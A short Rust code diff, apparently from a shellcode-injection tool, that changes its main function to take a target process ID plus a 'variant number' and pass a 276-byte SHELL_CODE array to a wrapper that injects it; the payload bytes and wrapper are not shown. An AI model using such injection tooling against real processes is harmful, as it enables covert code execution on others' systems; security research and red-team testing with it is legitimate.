@@ -24,12 +24,11 @@ pub const SHELL_CODE: [u8; 276] = [
 ];
 
 fn main() {
-    //get the target PID from user on command line
     let args: Vec<String> = std::env::args().collect();
     
-    if args.len() != 2 {
-        println!("Error: Missing target process ID");
-        println!("Usage: {} <target_pid>", args[0]);
+    if args.len() != 3 {
+        println!("Error: Missing arguments");
+        println!("Usage: {} <target_pid> <variant_number>", args[0]);
         std::process::exit(1);
     }
 
@@ -41,5 +40,15 @@ fn main() {
         }
     };
 
-    wrapper(&SHELL_CODE, pid);
+    let variant = match args[2].parse::<u32>() {
+        Ok(variant) => variant,
+        Err(_) => {
+            println!("Error: Invalid variant number. Please provide a valid number.");
+            std::process::exit(1);
+        }
+    };
+
+    let info_string = wrapper(&SHELL_CODE, pid, variant);
+    println!("{}", info_string);
 }
+
